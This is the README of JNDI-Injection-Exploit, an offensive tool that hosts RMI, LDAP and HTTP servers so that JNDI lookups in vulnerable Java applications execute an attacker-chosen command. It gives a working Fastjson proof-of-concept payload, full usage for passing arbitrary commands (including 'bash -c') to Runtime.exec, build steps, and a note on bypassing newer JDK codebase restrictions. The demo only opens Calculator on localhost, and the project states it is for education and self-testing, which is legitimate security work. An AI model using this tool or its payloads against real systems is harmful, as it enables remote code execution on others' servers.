# JNDI-Injection-Exploit

[Materials about JNDI Injection](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)

[中文文档](https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md)

[相关文章](https://www.cnblogs.com/Welk1n/p/11066397.html)

## Description

JNDI-Injection-Exploit is a tool for generating workable JNDI links and provide background services by starting RMI server,LDAP server and HTTP server. RMI server and LDAP server are based on  [marshals](https://github.com/mbechler/marshalsec) and modified further to link with HTTP server. 

Using this tool allows you get JNDI links, you can insert these links into your **POC** to test vulnerability. 

For example, this is a Fastjson vul-poc:

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/Object","autoCommit":true}
```

We can replace  "rmi://127.0.0.1:1099/Object" with the link generated by JNDI-Injection-Exploit to test vulnerability. 

## Disclaimer

All information and code is provided solely for educational purposes and/or testing your own systems for these vulnerabilities.

## Usage

 Run as

```shell
$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]
```

where:

- **-C** - command executed in the remote classfile.

  (optional , default command is "open /Applications/Calculator.app")

- **-A** - the address of your server, maybe an IP address or a domain.

  (optional , default address is the first network interface address)

Points for attention:

- make sure your server's ports (**1099**, **1389**, **8180**) are available .

  or you can change the default port in the run.ServerStart class line 26~28.

- your command is passed to **Runtime.getRuntime().exec()** as parameters, 

  so you need to ensure your command is workable in method exec().
  
  **Command in bash like "bash -c ...." need to add Double quotes.**

## Examples

 Local demo:

1. Start the tool like this:

   ```shell
   $ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "open /Applications/Calculator.app" -A "127.0.0.1"
   ```

    Screenshot:

   ![image-20191018154346759](https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/screenshots/1.png)

2. Assume that we inject the JNDI links like rmi://ADDRESS/jfxllc generated in step 1 to a vulnerable application which can be attacked by JNDI injection.

   In this example, it looks like this:

   ```java
   public static void main(String[] args) throws Exception{
       InitialContext ctx = new InitialContext();
       ctx.lookup("rmi://127.0.0.1/fgf4fp");
   }
   ```

   then when we run this code, the command will be executed ,

   and the log will be printed in shell:

   ![image-20191018154515787](https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/screenshots/2.png)



## Installation

We can select one of the two methods to get the jar.

1. Download the latest jar from [Realease](https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar).

2. Clone the source code to local and build (Requires Java 1.8+ and Maven 3.x+).

   ```shell
   $ git clone https://github.com/welk1n/JNDI-Injection-Exploit.git
   ```

   ```shell
   $ cd JNDI-Injection-Exploit
   ```

   ```shell
   $ mvn clean package -DskipTests
   ```

## To do

- (**Done**)Combine this project and [JNDI-Injection-Bypass](https://github.com/welk1n/JNDI-Injection-Bypass) to generate workable links when **trustURLCodebase is false** in higher versions of JDK by default.
- … ...
